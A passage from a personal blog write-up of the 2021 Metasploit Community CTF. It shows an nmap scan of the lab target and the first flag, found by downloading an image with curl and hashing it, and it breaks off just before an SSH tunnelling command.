---
layout: post
title: Metasploit Community CTF
date: 2021-12-06
type: post
tags:
- Writeup
- Hacking
- Metasploit
- CTF
permalink: /2021/12/MetasploitCommunityCTF
img: 2021/12/MetasploitCTF/Logo.png
---

This weekend, I participated in the [Metasploit Community CTF](https://metasploitctf.com/) with a team of members of the [Hackfest community](https://hackfest.ca/)

* [ava_kyoko](https://github.com/a42qc)
* [fil](https://lolkatz.github.io/will-hack-for-coffee/)
* [neoh](https://mikelizotte.ca/)

This was not a CTF with a Jeopardy still challenge board. We were given two VMs, one to use as a jump box, and one to attack. 

![Instructions Step 1](/assets/images/2021/12/MetasploitCTF/InstructionsStep1.png "Instructions Step 1")
![Instructions Step 2](/assets/images/2021/12/MetasploitCTF/InstructionsStep2.png "Instructions Step 2")

When I went to the list of challenges, they were all named after a deck of cards. 

![Challenges](/assets/images/2021/12/MetasploitCTF/Challenges.png "Challenges")

But clicking on one did not really help figuring out what I needed to do. 

![Challenge Description](/assets/images/2021/12/MetasploitCTF/ChallengeDescription.png "Challenge Description")

But at least I knew I needed to find images and calculate their MD5 checksum. 

> When you find a challenge flag, calculate and submit the MD5 checksum of the PNG image to receive points! Hashes are not case sensitive.

## Enumeration

So I connected to the jump box and started enumerating the opened port on the target machine. 

```bash
$ ssh kali@18.215.161.123 -i metasploit_ctf_kali_ssh_key.pem
Linux kali 5.10.0-kali9-cloud-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec  4 16:47:55 2021 from 24.48.3.104
┏━(Message from Kali developers)
┃
┃ This is a cloud installation of Kali Linux. Learn more about
┃ the specificities of the various cloud images:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-cloud-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)


┌──(kali㉿kali)-[~]
└─$ nmap 172.17.26.149 -A -p- -oN nmapFull.txt                        

# Nmap 7.92 scan initiated Sat Dec  4 02:40:19 2021 as: nmap -A -p- -oN nmapFull.txt 172.17.26.149
Nmap scan report for 172.17.26.149
Host is up (0.0048s latency).
Not shown: 65516 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
80/tcp    open  http       Werkzeug httpd 2.0.1 (Python 3.9.7)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.7
|_http-title: Metasploit CTF
443/tcp   open  http       Apache httpd 2.4.51
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.51 (Debian)
| http-git: 
|   172.17.26.149:443/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: More enthusiasm 
8080/tcp  open  http       WSGIServer 0.2 (Python 3.8.10)
|_http-server-header: WSGIServer/0.2 CPython/3.8.10
|_http-title: Cookies Galore
10010/tcp open  rxapi?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Download-Options: noopen
|     X-Permitted-Cross-Domain-Policies: none
|     Referrer-Policy: strict-origin-when-cross-origin
|     Link: </assets/application-b8c697e38f5ecf278f5ea80d758553eae08a5635194a002f5b5dc51db0ef1145.css>; rel=preload; as=style; nopush,</packs/js/application-e39138e5c24b0104f8e3.js>; rel=preload; as=script; nopush
|     Content-Type: text/html; charset=utf-8
|     ETag: W/"ddcfa692272d0ab325bec517183d8e60"
|     Cache-Control: max-age=0, private, must-revalidate
|     Set-Cookie: 321dece65c1d444b49c690630b2faca0d6e2f6e41cc5dacb19f2242ea6f745a44437e0f524427181e28f71d651f5982d9e36ba9542824f09cb103c7515d50a21ad2e4edd30573074c2d62296e6fb6ac5a4460060a646d108ede4a1793038eb061e8b27194ce54b5fbd3804f7ec76182fda465e6c51fc822eacc230b2f1721294=cM8s2cs90tvU4LEXjhMSoUfGkoiVKKQusdIWpbGhIvNkjVLRHSVB017
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     X-Request-Id: f6ff0af5-6cc9-48e6-bf16-b9dbc6da1244
|     X-Runtime: 0.002915
|     Content-Length: 1722
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>The page you were looking for doesn't exist (404)</title>
|     <meta name="viewport" content="width=device-width,initial-scale=1">
|     <style>
|     .rails-default-error-page {
|     background-color: #EFEFEF;
|     color: #2E2F30;
|     text-align: center;
|     font-family: arial, sans-serif;
|     margin: 0;
|     .rails-default-error-page div.dialog {
|     width: 95%;
|     max-width: 33em;
|     margin: 4em auto 0;
|     .rails-default-error-page div.dialog > div {
|     border: 1px solid #CCC;
|     border-right-color: #999;
|     border-left-color: #999;
|     border-bottom-color: #BBB;
|     border-top: #B00100 solid 4px;
|     border-top-left-radius: 9px;
|     border-top-right-radius: 9px;
|_    background-color: white
11111/tcp open  http       Thin httpd
|_http-server-header: thin
| http-title: Web App
|_Requested resource was http://172.17.26.149:11111/index
12380/tcp open  http       Apache httpd 2.4.49 ((Debian))
|_http-server-header: Apache/2.4.49 (Debian)
|_http-title: Site doesn't have a title (text/html).
15000/tcp open  hydap?
| fingerprint-strings: 
|   GenericLines: 
|     Welcome to the Student Database Management System!
|     Time is 2021-12-04 02:40:22 +0000.
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input: 
|     Error. Unrecognised choice: 0
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input: 
|     Error. Unrecognised choice: 0
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input:
|   GetRequest: 
|     Welcome to the Student Database Management System!
|     Time is 2021-12-04 02:40:33 +0000.
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input: 
|     Error. Unrecognised choice: 0
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input: 
|     Error. Unrecognised choice: 0
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|     Input:
|   NULL: 
|     Welcome to the Student Database Management System!
|     Time is 2021-12-04 02:40:22 +0000.
|     Pick one of the following options:
|     Create new student record
|     Show student records
|     Update an existing record
|     Delete student record
|     Exit
|_    Input:
15010/tcp open  http       Thin httpd
| http-title: Site doesn't have a title (text/html;charset=utf-8).
|_Requested resource was http://172.17.26.149:15010/index
|_http-server-header: thin
15122/tcp open  ssh        OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   3072 30:06:8b:5a:9b:7c:1c:1c:93:7a:bb:57:0a:1a:e4:e0 (RSA)
|   256 49:c0:84:75:38:b1:6b:50:4c:bd:37:77:c5:64:78:67 (ECDSA)
|_  256 f6:07:cf:3a:4a:49:db:2e:3b:a8:84:4e:c4:19:12:0a (ED25519)
20000/tcp open  http       SimpleHTTPServer 0.6 (Python 3.7.3)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/3.7.3
20001/tcp open  microsan?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    PyMissing game mode
20011/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 193
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid Request Line &#x27;Invalid HTTP request line: &#x27;&#x27;&#x27;
|     </body>
|     </html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 04 Dec 2021 02:40:28 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 947
|     <!doctype html>
|     <html>
|     <link rel="stylesheet" href="/static/style.css">
|     <head>
|     <title>CTF Gallery</title>
|     </head>
|     <body>
|     <h1>CTF Gallery</h1>
|     <div class="panel">
|     class="pan_item" href="/admin">admin</a>
|     </div>
|     <div class="gal_links"><p><a href="/gallery/Sarah">Sarah's gallery</a></p></div>
|     <div class="gal_links"><p><a href="/gallery/John">John's gallery</a></p></div>
|     <div class="gal_links"><p><a href="/gallery/Ripley">Ripley's gallery</a></p></div>
|     <div class="gal_links"><p><a href="/gallery/Ash">Ash's gallery</a></p></div>
|     <p>Some galleries have not yet been added to the main page.<br>For those cases, the form below can be used to access them.</p>
|     <div id
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 04 Dec 2021 02:40:28 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|_    Content-Length: 0
20022/tcp open  http       Apache httpd 2.4.51 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.51 (Debian)
20055/tcp open  http       Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Site doesn't have a title (text/html).
20123/tcp open  ssh        OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   3072 83:a3:ad:9e:e5:d3:4c:c3:27:4f:22:47:3e:d4:4b:07 (RSA)
|   256 83:33:6e:4a:04:b1:58:39:0f:fd:e4:1d:5e:53:46:2c (ECDSA)
|_  256 2a:a5:66:1a:af:d6:e5:78:8a:51:91:17:e3:57:91:9a (ED25519)
30033/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    [error] invalid input key
30034/tcp open  http       SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
33337/tcp open  http-proxy Apache Traffic Server 7.1.1
|_http-server-header: ATS/7.1.1
|_http-title: Did not follow redirect to http://threeofhearts.ctf.net/
35000/tcp open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Ace of Diamonds
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10010-TCP:V=7.92%I=7%D=12/4%Time=61AAD51C%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,AEB,"HTTP/1\.0\x20200\x20OK\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-X
SF:SS-Protection:\x201;\x20mode=block\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Download-Options:\x20noopen\r\nX-Permitted-Cross-Domain-Policies
SF::\x20none\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nLin
SF:k:\x20</assets/application-b8c697e38f5ecf278f5ea80d758553eae08a5635194a
SF:002f5b5dc51db0ef1145\.css>;\x20rel=preload;\x20as=style;\x20nopush,</pa
SF:cks/js/application-e39138e5c24b0104f8e3\.js>;\x20rel=preload;\x20as=scr
SF:ipt;\x20nopush\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nETag:
SF:\x20W/\"ddcfa692272d0ab325bec517183d8e60\"\r\nCache-Control:\x20max-age
SF:=0,\x20private,\x20must-revalidate\r\nSet-Cookie:\x20321dece65c1d444b49
SF:c690630b2faca0d6e2f6e41cc5dacb19f2242ea6f745a44437e0f524427181e28f71d65
SF:1f5982d9e36ba9542824f09cb103c7515d50a21ad2e4edd30573074c2d62296e6fb6ac5
SF:a4460060a646d108ede4a1793038eb061e8b27194ce54b5fbd3804f7ec76182fda465e6
SF:c51fc822eacc230b2f1721294=cM8s2cs90tvU4LEXjhMSoUfGkoiVKKQusdIWpbGhIvNkj
SF:VLRHSVB017")%r(HTTPOptions,75B,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCon
SF:tent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Request-Id:\x20f6ff0af5-
SF:6cc9-48e6-bf16-b9dbc6da1244\r\nX-Runtime:\x200\.002915\r\nContent-Lengt
SF:h:\x201722\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20<title>Th
SF:e\x20page\x20you\x20were\x20looking\x20for\x20doesn't\x20exist\x20\(404
SF:\)</title>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=devic
SF:e-width,initial-scale=1\">\n\x20\x20<style>\n\x20\x20\.rails-default-er
SF:ror-page\x20{\n\x20\x20\x20\x20background-color:\x20#EFEFEF;\n\x20\x20\
SF:x20\x20color:\x20#2E2F30;\n\x20\x20\x20\x20text-align:\x20center;\n\x20
SF:\x20\x20\x20font-family:\x20arial,\x20sans-serif;\n\x20\x20\x20\x20marg
SF:in:\x200;\n\x20\x20}\n\n\x20\x20\.rails-default-error-page\x20div\.dial
SF:og\x20{\n\x20\x20\x20\x20width:\x2095%;\n\x20\x20\x20\x20max-width:\x20
SF:33em;\n\x20\x20\x20\x20margin:\x204em\x20auto\x200;\n\x20\x20}\n\n\x20\
SF:x20\.rails-default-error-page\x20div\.dialog\x20>\x20div\x20{\n\x20\x20
SF:\x20\x20border:\x201px\x20solid\x20#CCC;\n\x20\x20\x20\x20border-right-
SF:color:\x20#999;\n\x20\x20\x20\x20border-left-color:\x20#999;\n\x20\x20\
SF:x20\x20border-bottom-color:\x20#BBB;\n\x20\x20\x20\x20border-top:\x20#B
SF:00100\x20solid\x204px;\n\x20\x20\x20\x20border-top-left-radius:\x209px;
SF:\n\x20\x20\x20\x20border-top-right-radius:\x209px;\n\x20\x20\x20\x20bac
SF:kground-color:\x20white");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port15000-TCP:V=7.92%I=7%D=12/4%Time=61AAD51C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,F6,"\nWelcome\x20to\x20the\x20Student\x20Database\x20Management\x20
SF:System!\nTime\x20is\x202021-12-04\x2002:40:22\x20\+0000\.\n\nPick\x20on
SF:e\x20of\x20the\x20following\x20options:\n1\.\x20Create\x20new\x20studen
SF:t\x20record\n2\.\x20Show\x20student\x20records\n3\.\x20Update\x20an\x20
SF:existing\x20record\n4\.\x20Delete\x20student\x20record\n5\.\x20Exit\n\n
SF:Input:\x20")%r(GenericLines,272,"\nWelcome\x20to\x20the\x20Student\x20D
SF:atabase\x20Management\x20System!\nTime\x20is\x202021-12-04\x2002:40:22\
SF:x20\+0000\.\n\nPick\x20one\x20of\x20the\x20following\x20options:\n1\.\x
SF:20Create\x20new\x20student\x20record\n2\.\x20Show\x20student\x20records
SF:\n3\.\x20Update\x20an\x20existing\x20record\n4\.\x20Delete\x20student\x
SF:20record\n5\.\x20Exit\n\nInput:\x20\nError\.\x20Unrecognised\x20choice:
SF:\x200\n\nPick\x20one\x20of\x20the\x20following\x20options:\n1\.\x20Crea
SF:te\x20new\x20student\x20record\n2\.\x20Show\x20student\x20records\n3\.\
SF:x20Update\x20an\x20existing\x20record\n4\.\x20Delete\x20student\x20reco
SF:rd\n5\.\x20Exit\n\nInput:\x20\nError\.\x20Unrecognised\x20choice:\x200\
SF:n\nPick\x20one\x20of\x20the\x20following\x20options:\n1\.\x20Create\x20
SF:new\x20student\x20record\n2\.\x20Show\x20student\x20records\n3\.\x20Upd
SF:ate\x20an\x20existing\x20record\n4\.\x20Delete\x20student\x20record\n5\
SF:.\x20Exit\n\nInput:\x20")%r(GetRequest,272,"\nWelcome\x20to\x20the\x20S
SF:tudent\x20Database\x20Management\x20System!\nTime\x20is\x202021-12-04\x
SF:2002:40:33\x20\+0000\.\n\nPick\x20one\x20of\x20the\x20following\x20opti
SF:ons:\n1\.\x20Create\x20new\x20student\x20record\n2\.\x20Show\x20student
SF:\x20records\n3\.\x20Update\x20an\x20existing\x20record\n4\.\x20Delete\x
SF:20student\x20record\n5\.\x20Exit\n\nInput:\x20\nError\.\x20Unrecognised
SF:\x20choice:\x200\n\nPick\x20one\x20of\x20the\x20following\x20options:\n
SF:1\.\x20Create\x20new\x20student\x20record\n2\.\x20Show\x20student\x20re
SF:cords\n3\.\x20Update\x20an\x20existing\x20record\n4\.\x20Delete\x20stud
SF:ent\x20record\n5\.\x20Exit\n\nInput:\x20\nError\.\x20Unrecognised\x20ch
SF:oice:\x200\n\nPick\x20one\x20of\x20the\x20following\x20options:\n1\.\x2
SF:0Create\x20new\x20student\x20record\n2\.\x20Show\x20student\x20records\
SF:n3\.\x20Update\x20an\x20existing\x20record\n4\.\x20Delete\x20student\x2
SF:0record\n5\.\x20Exit\n\nInput:\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port20001-TCP:V=7.92%I=7%D=12/4%Time=61AAD51C%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x
SF:0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c
SF:\0\x02Pz\0\0\0\x04")%r(GetRequest,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0
SF:\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20ga
SF:me\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(HTTPOptions,46,"\0\0\0F\0\
SF:0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x
SF:1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(RTS
SF:PRequest,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\
SF:0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c\0\
SF:x02Pz\0\0\0\x04")%r(RPCCheck,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\
SF:0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x2
SF:0mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(DNSVersionBindReqTCP,46,"\0\0\0
SF:F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0
SF:\0\x1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r
SF:(DNSStatusRequestTCP,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x0
SF:6\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mode\0\
SF:0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(Help,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x0
SF:2\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x2
SF:0game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(SSLSessionReq,46,"\0\0\
SF:0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\
SF:0\0\x1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%
SF:r(TerminalServerCookie,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\
SF:x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mode\
SF:0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(TLSSessionReq,46,"\0\0\0F\0\0\0\0\0\0
SF:\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01P
SF:yMissing\x20game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\x04")%r(X11Probe,46,
SF:"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0\0\x06\0\0\0\x0c\0\x02Px\0\0\
SF:0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mode\0\0\0\0\x0c\0\x02Pz\0\0\0\
SF:x04")%r(FourOhFourRequest,46,"\0\0\0F\0\0\0\0\0\0\0\x0c\0\x02\0\x01\0\0
SF:\0\x06\0\0\0\x0c\0\x02Px\0\0\0\0\0\0\0\x1a\0\x01PyMissing\x20game\x20mo
SF:de\0\0\0\0\x0c\0\x02Pz\0\0\0\x04");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port20011-TCP:V=7.92%I=7%D=12/4%Time=61AAD51C%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,11E,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\nContent-Type:\x20text/html\r\nContent-Length:\x20193\r\n\r\n<ht
SF:ml>\n\x20\x20<head>\n\x20\x20\x20\x20<title>Bad\x20Request</title>\n\x2
SF:0\x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p>
SF:</h1>\n\x20\x20\x20\x20Invalid\x20Request\x20Line\x20&#x27;Invalid\x20H
SF:TTP\x20request\x20line:\x20&#x27;&#x27;&#x27;\n\x20\x20</body>\n</html>
SF:\n")%r(GetRequest,44D,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\
SF:nDate:\x20Sat,\x2004\x20Dec\x202021\x2002:40:28\x20GMT\r\nConnection:\x
SF:20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x20947\r\n\r\n<!doctype\x20html>\n<html>\n\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"/static/style\.css\">\n\n\x20\x20<head>\n\x20\x20<
SF:title>CTF\x20Gallery</title>\n\x20\x20</head>\n\n\t<body>\n\t\t<h1>CTF\
SF:x20Gallery</h1>\n\x20\x20\x20\x20<div\x20class=\"panel\">\n\x20\x20\x20
SF:\x20\x20\x20<a\x20class=\"pan_item\"\x20href=\"/admin\">admin</a>\n\x20
SF:\x20\x20\x20</div>\n\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=\
SF:"gal_links\"><p><a\x20href=\"/gallery/Sarah\">Sarah's\x20gallery</a></p
SF:></div>\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=\"gal_links\">
SF:<p><a\x20href=\"/gallery/John\">John's\x20gallery</a></p></div>\n\x20\x
SF:20\x20\x20\n\x20\x20\x20\x20<div\x20class=\"gal_links\"><p><a\x20href=\
SF:"/gallery/Ripley\">Ripley's\x20gallery</a></p></div>\n\x20\x20\x20\x20\
SF:n\x20\x20\x20\x20<div\x20class=\"gal_links\"><p><a\x20href=\"/gallery/A
SF:sh\">Ash's\x20gallery</a></p></div>\n\x20\x20\x20\x20\n\n\x20\x20\x20\x
SF:20<p>Some\x20galleries\x20have\x20not\x20yet\x20been\x20added\x20to\x20
SF:the\x20main\x20page\.<br>For\x20those\x20cases,\x20the\x20form\x20below
SF:\x20can\x20be\x20used\x20to\x20access\x20them\.</p>\n\n\x20\x20\x20\x20
SF:<div\x20id")%r(HTTPOptions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gun
SF:icorn\r\nDate:\x20Sat,\x2004\x20Dec\x202021\x2002:40:28\x20GMT\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nAllo
SF:w:\x20OPTIONS,\x20HEAD,\x20GET\r\nContent-Length:\x200\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port30033-TCP:V=7.92%I=7%D=12/4%Time=61AAD51C%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(GetRequest,1
SF:A,"\[error\]\x20invalid\x20input\x20key\n")%r(HTTPOptions,1A,"\[error\]
SF:\x20invalid\x20input\x20key\n")%r(RTSPRequest,1A,"\[error\]\x20invalid\
SF:x20input\x20key\n")%r(RPCCheck,1A,"\[error\]\x20invalid\x20input\x20key
SF:\n")%r(DNSVersionBindReqTCP,1A,"\[error\]\x20invalid\x20input\x20key\n"
SF:)%r(DNSStatusRequestTCP,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(
SF:Help,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(SSLSessionReq,1A,"\
SF:[error\]\x20invalid\x20input\x20key\n")%r(TerminalServerCookie,1A,"\[er
SF:ror\]\x20invalid\x20input\x20key\n")%r(TLSSessionReq,1A,"\[error\]\x20i
SF:nvalid\x20input\x20key\n")%r(Kerberos,1A,"\[error\]\x20invalid\x20input
SF:\x20key\n")%r(SMBProgNeg,1A,"\[error\]\x20invalid\x20input\x20key\n")%r
SF:(X11Probe,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(FourOhFourRequ
SF:est,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(LPDString,1A,"\[erro
SF:r\]\x20invalid\x20input\x20key\n")%r(LDAPSearchReq,1A,"\[error\]\x20inv
SF:alid\x20input\x20key\n")%r(LDAPBindReq,1A,"\[error\]\x20invalid\x20inpu
SF:t\x20key\n")%r(SIPOptions,1A,"\[error\]\x20invalid\x20input\x20key\n")%
SF:r(LANDesk-RC,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(TerminalSer
SF:ver,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(NCP,1A,"\[error\]\x2
SF:0invalid\x20input\x20key\n")%r(NotesRPC,1A,"\[error\]\x20invalid\x20inp
SF:ut\x20key\n")%r(JavaRMI,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(
SF:WMSRequest,1A,"\[error\]\x20invalid\x20input\x20key\n")%r(oracle-tns,1A
SF:,"\[error\]\x20invalid\x20input\x20key\n")%r(ms-sql-s,1A,"\[error\]\x20
SF:invalid\x20input\x20key\n")%r(afp,1A,"\[error\]\x20invalid\x20input\x20
SF:key\n")%r(giop,1A,"\[error\]\x20invalid\x20input\x20key\n");
Service Info: Host: 172.18.10.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec  4 02:43:14 2021 -- 1 IP address (1 host up) scanned in 174.44 seconds
```


## First flag - Port 80

I decided to start with port 80. It seemed like an easy target. And neoh had already done it. 

I looked at what curl would give me. 
```bash
┌──(kali㉿kali)-[~/eric]
└─$ curl http://172.17.26.149
```

```html
<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">

  <title>Metasploit CTF</title>
  <link rel="stylesheet" href="css/styles.css?v=1.0">

  <style>
    body {
        margin: 0;
        font-family: sans-serif;
    }

    .h2 {
        font-size: 2em;
        color: #222;
        margin-bottom: 0.2em;
    }

    .container {
        text-align: center;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        height: 100vh;
    }
  </style>
</head>

<body>
    <div class="container">
        <div>
            <h2>Welcome!</h2>
            <img src="static/065c6daa-a6e2-4634-b9c6-2eed5274ec47.png" />
            <p>Your remaining challenges are on other ports</p>
        </div>
    </div>
</body>
</html>
```

This is simple HTML that displayed an image. I tried downloading the image.

```bash
──(kali㉿kali)-[~/eric]
└─$ curl http://172.17.26.149/static/065c6daa-a6e2-4634-b9c6-2eed5274ec47.png --output 065c6daa-a6e2-4634-b9c6-2eed5274ec47.png                                                                                                       23 ⨯
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  129k  100  129k    0     0  24.7M      0 --:--:-- --:--:-- --:--:-- 25.3M

┌──(kali㉿kali)-[~/eric]
└─$ md5sum 065c6daa-a6e2-4634-b9c6-2eed5274ec47.png 
3bb0409396fdc4e168c9185929af8347  065c6daa-a6e2-4634-b9c6-2eed5274ec47.png
```

The first flag was 3bb0409396fdc4e168c9185929af8347. 

I knew on which card it would have needed to be submitted because neoh had already done it. 

But the real way to find out was to look at the image. To do that, I used scp to get the image on my machine and then opened the image.

```bash
$ scp -i metasploit_ctf_kali_ssh_key.pem kali@18.215.161.123:~/eric/065c6daa-a6e2-4634-b9c6-2eed5274ec47.png .
```

![First Card](/assets/images/2021/12/MetasploitCTF/065c6daa-a6e2-4634-b9c6-2eed5274ec47.png "First Card")

## SSH Tunnel

I had the first flag, but I realized that using curl to look at HTML files and scp to transfer the files was going to be painful. So I checked how I could use a SSH tunnel to be able to query the target directly from my Kali VM. 

After some trial and error, I came up with this command:

